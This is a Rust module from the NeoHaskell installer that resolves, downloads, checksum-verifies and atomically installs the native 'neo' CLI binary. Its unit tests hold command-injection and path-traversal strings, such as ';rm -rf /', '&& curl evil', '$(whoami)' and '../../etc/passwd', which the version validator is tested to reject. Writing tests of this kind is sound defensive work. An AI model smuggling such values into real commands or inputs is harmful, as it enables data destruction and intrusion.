//! Native Neo CLI release resolution, download, verification, and atomic install.
//!
//! Normal users get `neo` as a *prebuilt native binary* downloaded from the
//! `neohaskell/NeoHaskell` GitHub releases — NOT by evaluating/compiling
//! `github:neohaskell/neo#neo-cli`. The Neo release train ships assets under
//! `neo-v*` tags, one asset per supported target, named by the single naming
//! contract [`neo_asset_name`] shares with the release workflow
//! (`.github/workflows/neo-release.yml`).
//!
//! The pieces here are split into two layers on purpose:
//!   - **Pure logic** (target mapping, tag selection, asset naming, checksum
//!     parsing/verification, atomic replacement, dry-run planning). These take
//!     their inputs as arguments and touch no network, so `--self-test`-grade
//!     unit tests can prove release selection, asset naming, checksum rejection,
//!     atomic replacement, and dry-run behavior deterministically.
//!   - **A single network seam** ([`Fetcher`]) that shells out to `curl` with
//!     *explicit args* (never a `sh -c` string), so no interpolation/injection
//!     path exists. Tests substitute an in-memory fetcher and never touch the
//!     network.

use std::path::{Path, PathBuf};

use anyhow::Result;
use sha2::{Digest, Sha256};

use crate::error::InstallerError;
use crate::{detect, ui};

/// The monorepo that publishes Neo CLI releases. Single source of truth shared
/// with the release workflow and asserted by the consistency tests.
pub const NEO_REPO: &str = "neohaskell/NeoHaskell";

/// Neo releases are tagged `neo-v*` (independent of the Haskell library tags and
/// the `installer-v*` tags). Only these tags carry the native `neo` assets.
pub const NEO_TAG_PREFIX: &str = "neo-v";

/// The checksum manifest published alongside the release assets.
pub const SHA256SUMS: &str = "SHA256SUMS";

/// Pin a specific release via this environment variable, e.g.
/// `NEO_VERSION=neo-v0.1.0`. Unset resolves the newest `neo-v*` release.
pub const NEO_VERSION_ENV: &str = "NEO_VERSION";

/// Override the user-writable directory the native binary is installed into.
/// Defaults to `$HOME/.local/bin`.
pub const NEO_BIN_DIR_ENV: &str = "NEO_BIN_DIR";

/// The release-asset name for a target triple. This is THE naming contract: the
/// release workflow packages each binary as `neo-<target>` and the installer
/// downloads exactly that. Changing it here means changing it in
/// `.github/workflows/neo-release.yml` (the consistency tests enforce both move
/// together).
pub fn neo_asset_name(target: &str) -> String {
    format!("neo-{target}")
}

/// The supported target triples, in the same order the release matrix builds
/// them. Shared with the consistency tests as the canonical target list.
pub const NEO_TARGETS: [&str; 4] = [
    "x86_64-unknown-linux-gnu",
    "aarch64-unknown-linux-gnu",
    "x86_64-apple-darwin",
    "aarch64-apple-darwin",
];

/// Map a detected OS/arch to the release target triple. Every branch is a
/// supported target; the caller has already rejected unsupported platforms.
pub fn release_target(os: &detect::Os, arch: &detect::Arch) -> Result<&'static str> {
    let target = match (os, arch) {
        (detect::Os::Linux, detect::Arch::X86_64) => "x86_64-unknown-linux-gnu",
        (detect::Os::Linux, detect::Arch::Aarch64) => "aarch64-unknown-linux-gnu",
        (detect::Os::MacOS, detect::Arch::X86_64) => "x86_64-apple-darwin",
        (detect::Os::MacOS, detect::Arch::Aarch64) => "aarch64-apple-darwin",
        _ => {
            return Err(InstallerError::UnsupportedPlatform {
                os: format!("{os:?}"),
                arch: format!("{arch:?}"),
            }
            .into());
        }
    };
    Ok(target)
}

/// A pinned `NEO_VERSION` must name a `neo-v*` tag and contain only characters
/// that are safe in a release-download URL path segment. This rejects any tag
/// that could smuggle a path traversal or a shell metacharacter into a later
/// `curl` argument (defense in depth: the download never uses a shell, but a
/// validated tag is a hard guarantee at the boundary).
pub fn validate_pinned_version(value: &str) -> Result<String> {
    let bad = |details: String| InstallerError::InvalidNeoVersion {
        value: value.to_string(),
        details,
    };
    if !value.starts_with(NEO_TAG_PREFIX) {
        return Err(bad(format!(
            "a pinned {NEO_VERSION_ENV} must be a Neo release tag beginning with '{NEO_TAG_PREFIX}' \
             (for example {NEO_TAG_PREFIX}0.1.0)"
        ))
        .into());
    }
    let ok = value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'));
    if !ok {
        return Err(bad(
            "a release tag may contain only letters, digits, '.', '-' and '_' \
             (no '/', spaces, or shell metacharacters)"
                .to_string(),
        )
        .into());
    }
    Ok(value.to_string())
}

/// One entry of GitHub's "list releases" response. Only `tag_name` is load-
/// bearing; the rest of the (large) schema is ignored. Parsed with `serde_json`
/// so a malformed or unexpected payload is a hard error, never a silently
/// mis-scanned string.
#[derive(serde::Deserialize)]
struct ReleaseEntry {
    tag_name: Option<String>,
}

/// Parse a GitHub "list releases" body into its release entries. A body that is
/// not a JSON array of release objects is a hard, actionable failure.
fn parse_release_entries(releases_json: &str) -> Result<Vec<ReleaseEntry>> {
    serde_json::from_str::<Vec<ReleaseEntry>>(releases_json).map_err(|e| {
        InstallerError::NeoReleaseResolutionFailed {
            details: format!("could not parse the GitHub releases response as JSON: {e}"),
        }
        .into()
    })
}

/// The `tag_name` values in a release-list payload, in payload order (the API
/// returns newest-first). Errors if the payload is not valid releases JSON.
pub fn parse_tag_names(releases_json: &str) -> Result<Vec<String>> {
    Ok(parse_release_entries(releases_json)?
        .into_iter()
        .filter_map(|e| e.tag_name)
        .collect())
}

/// The newest tag that is BOTH a `neo-v*` tag AND passes the same strict
/// validation a pinned version must pass. Validating here means a malformed or
/// path-like tag returned by the API can never be selected and interpolated into
/// a download URL. The API returns newest-first, so the first match is the
/// newest. Errors only if the payload is not valid releases JSON.
pub fn newest_neo_tag(releases_json: &str) -> Result<Option<String>> {
    Ok(parse_tag_names(releases_json)?
        .into_iter()
        .find(|t| t.starts_with(NEO_TAG_PREFIX) && validate_pinned_version(t).is_ok()))
}

/// A hard cap on release-list paging, so a buggy or hostile endpoint that keeps
/// returning non-empty pages can never spin forever (100 pages × 100/page).
const MAX_RELEASE_PAGES: u32 = 100;

/// Resolve the tag to install: an explicit pin wins (validated), otherwise page
/// through the repo's releases newest-first until a VALID `neo-v*` tag turns up.
/// The repository-wide `releases/latest` redirect is deliberately NOT used — it
/// points at the newest release of ANY tag prefix (e.g. a Haskell library tag),
/// which would 404 for the `neo` asset. `fetch_page(n)` returns the JSON for page
/// `n` (1-based, 100/page); an empty array ends the stream. EVERY candidate tag
/// is validated before it can be returned, so the caller always builds a URL from
/// a known-safe tag.
pub fn resolve_neo_tag(
    pinned: Option<&str>,
    fetch_page: impl Fn(u32) -> Result<String>,
) -> Result<String> {
    if let Some(p) = pinned {
        return validate_pinned_version(p);
    }
    let mut page = 1u32;
    while page <= MAX_RELEASE_PAGES {
        let body = fetch_page(page)?;
        let entries = parse_release_entries(&body)?;
        if entries.is_empty() {
            // Empty/last page — end of stream. Fail loudly below.
            break;
        }
        let found = entries
            .iter()
            .filter_map(|e| e.tag_name.as_deref())
            .find(|t| t.starts_with(NEO_TAG_PREFIX) && validate_pinned_version(t).is_ok());
        if let Some(tag) = found {
            return Ok(tag.to_string());
        }
        page += 1;
    }
    Err(InstallerError::NeoReleaseResolutionFailed {
        details: format!(
            "no '{NEO_TAG_PREFIX}*' release found on {NEO_REPO}. \
             Pin one explicitly with {NEO_VERSION_ENV}={NEO_TAG_PREFIX}X.Y.Z"
        ),
    }
    .into())
}

/// The expected lowercase-hex SHA256 for `asset` from a `SHA256SUMS` manifest
/// (the `sha256sum` format: `<hex>␠␠<name>`, where the name may carry a leading
/// `*` binary marker). `None` if the asset is not listed.
pub fn expected_checksum(sha256sums: &str, asset: &str) -> Option<String> {
    for line in sha256sums.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let mut parts = line.split_whitespace();
        let hex = parts.next()?;
        let name = parts.next()?.trim_start_matches('*');
        if name == asset {
            return Some(hex.to_ascii_lowercase());
        }
    }
    None
}

/// The lowercase-hex SHA256 of `bytes`.
pub fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    let digest = hasher.finalize();
    let mut out = String::with_capacity(digest.len() * 2);
    for b in digest {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

/// Verify `bytes` hashes to `expected` (case-insensitive hex). A mismatch is a
/// hard, actionable failure: the asset is corrupt or tampered and MUST NOT be
/// installed.
pub fn verify_sha256(bytes: &[u8], asset: &str, expected: &str) -> Result<()> {
    let actual = sha256_hex(bytes);
    if actual.eq_ignore_ascii_case(expected) {
        Ok(())
    } else {
        Err(InstallerError::NeoChecksumMismatch {
            asset: asset.to_string(),
            expected: expected.to_ascii_lowercase(),
            actual,
        }
        .into())
    }
}

/// Reject a `$NEO_BIN_DIR` that is not a safe, absolute directory path. It must
/// be absolute and free of control characters (newlines, tabs, NUL, …). Such a
/// value would otherwise be written into the user's shell profile PATH line and
/// could corrupt it or — with a newline or an unescaped metacharacter — inject
/// shell code the next interactive shell would execute. Returns the validated
/// path; the emission side ([`shell_path_line`]) additionally SINGLE-QUOTES it.
pub fn validate_bin_dir(raw: &str) -> Result<PathBuf> {
    let bad = |details: &str| InstallerError::InvalidBinDir {
        value: raw.to_string(),
        details: details.to_string(),
    };
    if raw.is_empty() {
        return Err(bad("it is empty").into());
    }
    if !raw.starts_with('/') {
        return Err(bad("it must be an absolute path (start with '/')").into());
    }
    if raw.chars().any(|c| c.is_control()) {
        return Err(bad("it must not contain control characters (newlines, tabs, NUL, …)").into());
    }
    Ok(PathBuf::from(raw))
}

/// The validated `$NEO_BIN_DIR` override, or `None` when unset/empty. Errors when
/// it is set but invalid, so a bad value fails the install rather than silently
/// mangling the shell profile.
pub fn bin_dir_override() -> Result<Option<PathBuf>> {
    match std::env::var(NEO_BIN_DIR_ENV) {
        Ok(dir) if !dir.is_empty() => Ok(Some(validate_bin_dir(&dir)?)),
        _ => Ok(None),
    }
}

/// The user-writable directory the native `neo` binary is installed into: a
/// validated `$NEO_BIN_DIR` override, otherwise `$HOME/.local/bin`.
pub fn default_bin_dir() -> Result<PathBuf> {
    if let Some(dir) = bin_dir_override()? {
        return Ok(dir);
    }
    let home = std::env::var("HOME").map_err(|_| InstallerError::NeoInstallFailed {
        details: "HOME is not set, so the user bin directory cannot be resolved".into(),
    })?;
    Ok(PathBuf::from(home).join(".local").join("bin"))
}

/// POSIX single-quote a string into a single literal shell word (bash/zsh): wrap
/// in `'…'` and render any embedded `'` as `'\''`. The result cannot be
/// re-interpreted by the shell — every metacharacter inside is literal.
pub fn posix_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Fish single-quote a string: inside fish single quotes only `\` and `'` are
/// special, so escape those (backslash first) and wrap in `'…'`.
pub fn fish_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\\', "\\\\").replace('\'', "\\'"))
}

/// The shell `PATH` line that puts the native `neo` bin dir (first) plus the Nix
/// profile dirs on PATH, correctly quoted for `shell`.
///
/// The default bin dir is emitted as the literal `$HOME/.local/bin` — our own
/// constant, safe to let the shell expand. An explicit `$NEO_BIN_DIR` override is
/// a validated absolute path emitted SINGLE-QUOTED, so no metacharacter (quote,
/// `$`, `;`, backtick, space, …) in it can be interpreted by the user's shell.
/// Errors if `$NEO_BIN_DIR` is set but invalid.
pub fn shell_path_line(shell: &detect::Shell) -> Result<String> {
    Ok(path_line_for(shell, bin_dir_override()?.as_deref()))
}

/// Pure PATH-line construction (no env access), so the quoting/injection tests
/// can exercise arbitrary override values deterministically. `override_dir`, when
/// present, is an already-validated absolute path.
fn path_line_for(shell: &detect::Shell, override_dir: Option<&Path>) -> String {
    let nixp = "/nix/var/nix/profiles/default/bin";
    match override_dir {
        None => match shell {
            detect::Shell::Fish => {
                format!("fish_add_path $HOME/.local/bin {nixp} $HOME/.nix-profile/bin")
            }
            _ => format!(r#"export PATH="$HOME/.local/bin:{nixp}:$HOME/.nix-profile/bin:$PATH""#),
        },
        Some(dir) => {
            let d = dir.to_string_lossy();
            match shell {
                detect::Shell::Fish => format!(
                    "fish_add_path {} {nixp} $HOME/.nix-profile/bin",
                    fish_single_quote(&d)
                ),
                // The override is single-quoted (injection-proof); the remaining
                // segment is separately double-quoted so $HOME/$PATH still expand.
                _ => format!(
                    r#"export PATH={}":{nixp}:$HOME/.nix-profile/bin:$PATH""#,
                    posix_single_quote(&d)
                ),
            }
        }
    }
}

/// Install `bytes` at `dest` atomically: write to a temp file in the *same
/// directory* (so the final step is a rename on one filesystem — never a
/// cross-device copy), mark it executable, then rename over `dest`. A reader
/// either sees the old binary or the new one, never a half-written file, and a
/// crash mid-download never leaves a corrupt `neo` in place.
pub fn atomic_install(bytes: &[u8], dest: &Path) -> Result<()> {
    let dir = dest
        .parent()
        .ok_or_else(|| InstallerError::NeoInstallFailed {
            details: format!(
                "install destination has no parent directory: {}",
                dest.display()
            ),
        })?;
    std::fs::create_dir_all(dir).map_err(|e| InstallerError::NeoInstallFailed {
        details: format!("could not create {}: {e}", dir.display()),
    })?;

    let mut tmp =
        tempfile::NamedTempFile::new_in(dir).map_err(|e| InstallerError::NeoInstallFailed {
            details: format!("could not create a temp file in {}: {e}", dir.display()),
        })?;
    use std::io::Write;
    tmp.write_all(bytes)
        .map_err(|e| InstallerError::NeoInstallFailed {
            details: format!("could not write the downloaded binary: {e}"),
        })?;
    tmp.flush().ok();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o755);
        std::fs::set_permissions(tmp.path(), perms).map_err(|e| {
            InstallerError::NeoInstallFailed {
                details: format!("could not mark the binary executable: {e}"),
            }
        })?;
    }

    tmp.persist(dest)
        .map_err(|e| InstallerError::NeoInstallFailed {
            details: format!(
                "could not atomically install to {}: {}",
                dest.display(),
                e.error
            ),
        })?;
    Ok(())
}

/// Build the download URL for a release asset. `tag` and `asset` are already
/// validated/derived (no user free-text reaches the shell — there is no shell).
pub fn asset_download_url(tag: &str, asset: &str) -> String {
    format!("https://github.com/{NEO_REPO}/releases/download/{tag}/{asset}")
}

/// The releases-list API URL for page `n` (100/page, newest-first).
pub fn releases_page_url(page: u32) -> String {
    format!("https://api.github.com/repos/{NEO_REPO}/releases?per_page=100&page={page}")
}

/// A one-line, side-effect-free summary of what a real (non-dry) install would
/// do, printed under `--dry-run`.
pub fn dry_run_plan(target: &str, pinned: Option<&str>, dest: &Path) -> String {
    let version = pinned.unwrap_or("<newest neo-v* release>");
    format!(
        "Would download {asset} ({version}) from {NEO_REPO}, verify it against {SHA256SUMS}, \
         and install it atomically to {dest}",
        asset = neo_asset_name(target),
        dest = dest.display(),
    )
}

// --------------------------------------------------------------------------- //
// Network seam: `curl` with explicit args (no shell, no interpolation).        //
// --------------------------------------------------------------------------- //

/// Fetches URLs. The production impl shells out to `curl` with explicit args;
/// tests use an in-memory impl and never touch the network.
pub trait Fetcher {
    fn text(&self, url: &str) -> Result<String>;
    fn bytes(&self, url: &str) -> Result<Vec<u8>>;
}

/// Production fetcher: `curl --proto '=https' --tlsv1.2 -fsSL <url>`. Every
/// argument is a separate `Command` arg — the URL is data, never part of a
/// shell command string, so there is no interpolation/injection surface.
pub struct CurlFetcher;

impl CurlFetcher {
    fn run(&self, url: &str) -> Result<Vec<u8>> {
        use std::process::Command;
        let output = Command::new("curl")
            .args(["--proto", "=https", "--tlsv1.2", "-fsSL", url])
            .output()
            .map_err(InstallerError::CommandFailed)?;
        if output.status.success() {
            Ok(output.stdout)
        } else {
            Err(InstallerError::NeoDownloadFailed {
                url: url.to_string(),
                details: String::from_utf8_lossy(&output.stderr).trim().to_string(),
            }
            .into())
        }
    }
}

impl Fetcher for CurlFetcher {
    fn text(&self, url: &str) -> Result<String> {
        Ok(String::from_utf8_lossy(&self.run(url)?).into_owned())
    }
    fn bytes(&self, url: &str) -> Result<Vec<u8>> {
        self.run(url)
    }
}

/// Resolve, download, verify, and atomically install the native `neo` binary.
/// `pinned` is the validated/None `NEO_VERSION`. All network I/O goes through
/// `fetch`; all filesystem effects land under `dest`.
pub fn download_verify_install(
    fetch: &dyn Fetcher,
    target: &str,
    pinned: Option<&str>,
    dest: &Path,
) -> Result<String> {
    let tag = resolve_neo_tag(pinned, |page| fetch.text(&releases_page_url(page)))?;
    let asset = neo_asset_name(target);

    let sums = fetch.text(&asset_download_url(&tag, SHA256SUMS))?;
    let expected =
        expected_checksum(&sums, &asset).ok_or_else(|| InstallerError::NeoChecksumMissing {
            asset: asset.clone(),
            tag: tag.clone(),
        })?;

    let bytes = fetch.bytes(&asset_download_url(&tag, &asset))?;
    verify_sha256(&bytes, &asset, &expected)?;

    atomic_install(&bytes, dest)?;
    Ok(tag)
}

/// Step 3 of the installer: put the native `neo` binary in place.
pub fn install_neo(verbose: bool, dry_run: bool) -> Result<()> {
    let os = detect::detect_os();
    let arch = detect::detect_arch();
    let target = release_target(&os, &arch)?;
    let pinned_raw = std::env::var(NEO_VERSION_ENV)
        .ok()
        .filter(|s| !s.is_empty());
    let pinned = pinned_raw.as_deref();
    let dest = default_bin_dir()?.join("neo");

    if dry_run {
        ui::print_step(&dry_run_plan(target, pinned, &dest), true);
        return Ok(());
    }

    // Validate a pin up front so a bad value fails before any network I/O.
    if let Some(p) = pinned {
        validate_pinned_version(p)?;
    }

    let pb = ui::create_spinner(ui::MSG_NEO_CLI);
    let fetch = CurlFetcher;
    match download_verify_install(&fetch, target, pinned, &dest) {
        Ok(tag) => {
            ui::finish_success(
                &pb,
                &format!("Neo CLI {tag} installed to {}", dest.display()),
            );
            if verbose {
                ui::print_step(
                    &format!("Installed native asset {}", neo_asset_name(target)),
                    true,
                );
            }
            Ok(())
        }
        Err(e) => {
            ui::finish_error(&pb, "Neo CLI installation failed");
            Err(e)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::cell::RefCell;

    #[test]
    fn asset_name_is_neo_dash_target() {
        assert_eq!(
            neo_asset_name("x86_64-unknown-linux-gnu"),
            "neo-x86_64-unknown-linux-gnu"
        );
        for t in NEO_TARGETS {
            assert_eq!(neo_asset_name(t), format!("neo-{t}"));
        }
    }

    #[test]
    fn release_target_maps_every_supported_platform() {
        assert_eq!(
            release_target(&detect::Os::Linux, &detect::Arch::X86_64).unwrap(),
            "x86_64-unknown-linux-gnu"
        );
        assert_eq!(
            release_target(&detect::Os::Linux, &detect::Arch::Aarch64).unwrap(),
            "aarch64-unknown-linux-gnu"
        );
        assert_eq!(
            release_target(&detect::Os::MacOS, &detect::Arch::X86_64).unwrap(),
            "x86_64-apple-darwin"
        );
        assert_eq!(
            release_target(&detect::Os::MacOS, &detect::Arch::Aarch64).unwrap(),
            "aarch64-apple-darwin"
        );
    }

    #[test]
    fn release_target_covers_exactly_the_matrix() {
        let mut mapped: Vec<&str> = vec![
            release_target(&detect::Os::Linux, &detect::Arch::X86_64).unwrap(),
            release_target(&detect::Os::Linux, &detect::Arch::Aarch64).unwrap(),
            release_target(&detect::Os::MacOS, &detect::Arch::X86_64).unwrap(),
            release_target(&detect::Os::MacOS, &detect::Arch::Aarch64).unwrap(),
        ];
        mapped.sort_unstable();
        let mut expected: Vec<&str> = NEO_TARGETS.to_vec();
        expected.sort_unstable();
        assert_eq!(mapped, expected);
    }

    #[test]
    fn release_target_rejects_unsupported() {
        assert!(release_target(
            &detect::Os::Unsupported("windows".into()),
            &detect::Arch::X86_64
        )
        .is_err());
        assert!(release_target(
            &detect::Os::Linux,
            &detect::Arch::Unsupported("riscv".into())
        )
        .is_err());
    }

    #[test]
    fn pinned_version_must_be_neo_v_prefixed() {
        assert!(validate_pinned_version("v0.1.0").is_err());
        assert!(validate_pinned_version("installer-v0.1.0").is_err());
        assert_eq!(validate_pinned_version("neo-v0.1.0").unwrap(), "neo-v0.1.0");
    }

    #[test]
    fn pinned_version_rejects_injection_characters() {
        for bad in [
            "neo-v0.1.0/../../etc/passwd",
            "neo-v0.1.0;rm -rf /",
            "neo-v0.1.0 && curl evil",
            "neo-v0.1.0$(whoami)",
            "neo-v0.1.0`id`",
        ] {
            assert!(
                validate_pinned_version(bad).is_err(),
                "should reject {bad:?}"
            );
        }
    }

    #[test]
    fn parse_tag_names_preserves_order() {
        let json = r#"[
          {"tag_name": "core-v9.9.9"},
          {"tag_name": "neo-v1.2.3"},
          {"tag_name": "neo-v1.0.0"}
        ]"#;
        assert_eq!(
            parse_tag_names(json).unwrap(),
            vec!["core-v9.9.9", "neo-v1.2.3", "neo-v1.0.0"]
        );
    }

    #[test]
    fn parse_tag_names_rejects_malformed_json() {
        // A truncated / non-array body must be a hard error, never an empty scan.
        assert!(parse_tag_names("not json at all").is_err());
        assert!(parse_tag_names(r#"{"tag_name":"neo-v1"}"#).is_err()); // object, not array
        assert!(parse_tag_names(r#"[{"tag_name": "neo-v1.0.0""#).is_err()); // truncated
    }

    #[test]
    fn parse_tag_names_tolerates_missing_and_extra_fields() {
        // Real GitHub payloads carry many fields and some entries (drafts) can
        // lack a tag_name; serde ignores extras and skips the null tag.
        let json = r#"[
          {"tag_name": "neo-v1.0.0", "name": "n", "id": 5, "assets": []},
          {"name": "draft with no tag", "id": 6}
        ]"#;
        assert_eq!(parse_tag_names(json).unwrap(), vec!["neo-v1.0.0"]);
    }

    #[test]
    fn newest_neo_tag_ignores_newer_non_neo_release() {
        let json = r#"[
          {"tag_name": "core-v9.9.9"},
          {"tag_name": "neo-v1.2.3"},
          {"tag_name": "neo-v1.0.0"}
        ]"#;
        assert_eq!(newest_neo_tag(json).unwrap().as_deref(), Some("neo-v1.2.3"));
    }

    #[test]
    fn newest_neo_tag_skips_a_malformed_neo_tag() {
        // A tag that LOOKS like neo-v but is malformed (path traversal) must be
        // rejected by validation and skipped, so the newest VALID neo tag wins.
        let json = r#"[
          {"tag_name": "neo-v9.9.9/../../etc"},
          {"tag_name": "neo-v1.2.3"}
        ]"#;
        assert_eq!(newest_neo_tag(json).unwrap().as_deref(), Some("neo-v1.2.3"));
    }

    #[test]
    fn newest_neo_tag_none_when_absent() {
        assert!(newest_neo_tag(r#"[{"tag_name":"core-v1.0.0"}]"#)
            .unwrap()
            .is_none());
    }

    #[test]
    fn newest_neo_tag_errors_on_malformed_json() {
        assert!(newest_neo_tag("<html>rate limited</html>").is_err());
    }

    #[test]
    fn resolve_errors_on_malformed_json_page() {
        let err = resolve_neo_tag(None, |_| Ok("nonsense".to_string())).unwrap_err();
        assert!(err.to_string().contains("JSON"));
    }

    #[test]
    fn resolve_skips_malformed_tag_and_picks_valid_one() {
        let page = r#"[{"tag_name":"neo-v2.0.0;rm -rf"},{"tag_name":"neo-v1.9.0"}]"#;
        let tag = resolve_neo_tag(None, |p| {
            Ok(if p == 1 {
                page.to_string()
            } else {
                "[]".to_string()
            })
        })
        .unwrap();
        assert_eq!(tag, "neo-v1.9.0");
    }

    #[test]
    fn resolve_pinned_wins_without_network() {
        let tag = resolve_neo_tag(Some("neo-v0.4.2"), |_| {
            panic!("must not fetch when a pin is provided")
        })
        .unwrap();
        assert_eq!(tag, "neo-v0.4.2");
    }

    #[test]
    fn resolve_pages_until_neo_release_found() {
        let page1 = r#"[{"tag_name":"core-v9.9.9"},{"tag_name":"core-v9.9.8"}]"#;
        let page2 = r#"[{"tag_name":"neo-v3.1.0"},{"tag_name":"neo-v3.0.0"}]"#;
        let calls = RefCell::new(Vec::new());
        let tag = resolve_neo_tag(None, |page| {
            calls.borrow_mut().push(page);
            Ok(match page {
                1 => page1.to_string(),
                2 => page2.to_string(),
                _ => "[]".to_string(),
            })
        })
        .unwrap();
        assert_eq!(tag, "neo-v3.1.0");
        assert_eq!(*calls.borrow(), vec![1, 2]);
    }

    #[test]
    fn resolve_stops_at_empty_page_and_fails_loudly() {
        let err = resolve_neo_tag(None, |page| {
            Ok(if page == 1 {
                r#"[{"tag_name":"core-v1.0.0"}]"#.to_string()
            } else {
                "[]".to_string()
            })
        })
        .unwrap_err();
        assert!(err.to_string().contains(NEO_TAG_PREFIX));
    }

    #[test]
    fn resolve_propagates_fetch_failure() {
        let err = resolve_neo_tag(None, |_| {
            Err(InstallerError::NeoDownloadFailed {
                url: "u".into(),
                details: "boom".into(),
            }
            .into())
        })
        .unwrap_err();
        assert!(err.to_string().contains("boom"));
    }

    #[test]
    fn expected_checksum_parses_sha256sum_format() {
        let sums = "\
deadbeef  neo-x86_64-unknown-linux-gnu
cafef00d *neo-aarch64-apple-darwin
";
        assert_eq!(
            expected_checksum(sums, "neo-x86_64-unknown-linux-gnu").as_deref(),
            Some("deadbeef")
        );
        // leading '*' binary marker tolerated
        assert_eq!(
            expected_checksum(sums, "neo-aarch64-apple-darwin").as_deref(),
            Some("cafef00d")
        );
        assert!(expected_checksum(sums, "neo-not-listed").is_none());
    }

    #[test]
    fn sha256_hex_is_known_answer() {
        // echo -n "" | sha256sum
        assert_eq!(
            sha256_hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn verify_accepts_matching_and_rejects_mismatch() {
        let bytes = b"neo binary contents";
        let good = sha256_hex(bytes);
        assert!(verify_sha256(bytes, "neo-x", &good).is_ok());
        // case-insensitive
        assert!(verify_sha256(bytes, "neo-x", &good.to_uppercase()).is_ok());
        let err = verify_sha256(bytes, "neo-x", "0000").unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("neo-x"));
        assert!(msg.contains("0000"));
    }

    #[test]
    fn atomic_install_writes_executable_and_replaces() {
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("neo");
        atomic_install(b"#!/bin/sh\necho v1\n", &dest).unwrap();
        assert_eq!(std::fs::read(&dest).unwrap(), b"#!/bin/sh\necho v1\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&dest).unwrap().permissions().mode();
            assert_eq!(mode & 0o111, 0o111, "installed binary must be executable");
        }
        // Atomic replacement over an existing file.
        atomic_install(b"#!/bin/sh\necho v2\n", &dest).unwrap();
        assert_eq!(std::fs::read(&dest).unwrap(), b"#!/bin/sh\necho v2\n");
    }

    #[test]
    fn atomic_install_creates_missing_bin_dir() {
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("nested").join("bin").join("neo");
        atomic_install(b"x", &dest).unwrap();
        assert!(dest.exists());
    }

    #[test]
    fn dry_run_plan_names_asset_and_dest_without_side_effects() {
        let plan = dry_run_plan(
            "x86_64-unknown-linux-gnu",
            Some("neo-v0.1.0"),
            Path::new("/home/u/.local/bin/neo"),
        );
        assert!(plan.contains("neo-x86_64-unknown-linux-gnu"));
        assert!(plan.contains("neo-v0.1.0"));
        assert!(plan.contains("/home/u/.local/bin/neo"));
        assert!(plan.contains(SHA256SUMS));
        let plan_latest = dry_run_plan("aarch64-apple-darwin", None, Path::new("/x/neo"));
        assert!(plan_latest.contains("newest"));
    }

    /// In-memory fetcher: routes URLs to fixtures, records the URLs hit.
    struct FakeFetcher {
        releases: String,
        sums: String,
        asset: Vec<u8>,
        hits: RefCell<Vec<String>>,
    }
    impl Fetcher for FakeFetcher {
        fn text(&self, url: &str) -> Result<String> {
            self.hits.borrow_mut().push(url.to_string());
            if url.contains("api.github.com") {
                if url.ends_with("page=1") {
                    Ok(self.releases.clone())
                } else {
                    Ok("[]".to_string())
                }
            } else if url.ends_with(SHA256SUMS) {
                Ok(self.sums.clone())
            } else {
                panic!("unexpected text url: {url}")
            }
        }
        fn bytes(&self, url: &str) -> Result<Vec<u8>> {
            self.hits.borrow_mut().push(url.to_string());
            Ok(self.asset.clone())
        }
    }

    #[test]
    fn end_to_end_download_verify_install_happy_path() {
        let target = "x86_64-unknown-linux-gnu";
        let asset = neo_asset_name(target);
        let bytes = b"the neo binary".to_vec();
        let hex = sha256_hex(&bytes);
        let fake = FakeFetcher {
            releases: r#"[{"tag_name":"neo-v2.0.0"}]"#.to_string(),
            sums: format!("{hex}  {asset}\n"),
            asset: bytes.clone(),
            hits: RefCell::new(Vec::new()),
        };
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("neo");
        let tag = download_verify_install(&fake, target, None, &dest).unwrap();
        assert_eq!(tag, "neo-v2.0.0");
        assert_eq!(std::fs::read(&dest).unwrap(), bytes);
        // Never used the repo-wide releases/latest redirect.
        assert!(fake
            .hits
            .borrow()
            .iter()
            .all(|u| !u.contains("releases/latest")));
    }

    #[test]
    fn end_to_end_rejects_tampered_asset_before_install() {
        let target = "aarch64-apple-darwin";
        let asset = neo_asset_name(target);
        let fake = FakeFetcher {
            releases: r#"[{"tag_name":"neo-v2.0.0"}]"#.to_string(),
            // checksum for different content than the asset actually served
            sums: format!("{}  {asset}\n", sha256_hex(b"expected contents")),
            asset: b"TAMPERED contents".to_vec(),
            hits: RefCell::new(Vec::new()),
        };
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("neo");
        let err = download_verify_install(&fake, target, None, &dest).unwrap_err();
        assert!(err.to_string().to_lowercase().contains("checksum"));
        assert!(!dest.exists(), "a tampered asset must NEVER be installed");
    }

    #[test]
    fn end_to_end_fails_when_asset_absent_from_manifest() {
        let target = "x86_64-apple-darwin";
        let fake = FakeFetcher {
            releases: r#"[{"tag_name":"neo-v2.0.0"}]"#.to_string(),
            sums: "abc  neo-some-other-target\n".to_string(),
            asset: b"x".to_vec(),
            hits: RefCell::new(Vec::new()),
        };
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("neo");
        let err = download_verify_install(&fake, target, None, &dest).unwrap_err();
        assert!(err.to_string().contains(&neo_asset_name(target)));
        assert!(!dest.exists());
    }

    #[test]
    fn download_urls_are_tag_scoped_not_latest() {
        assert_eq!(
            asset_download_url("neo-v1.0.0", "neo-x86_64-unknown-linux-gnu"),
            "https://github.com/neohaskell/NeoHaskell/releases/download/neo-v1.0.0/neo-x86_64-unknown-linux-gnu"
        );
        assert!(!releases_page_url(1).contains("releases/latest"));
        assert!(releases_page_url(2).ends_with("page=2"));
    }

    #[test]
    fn install_neo_dry_run_touches_nothing() {
        assert!(install_neo(false, true).is_ok());
        assert!(install_neo(true, true).is_ok());
    }

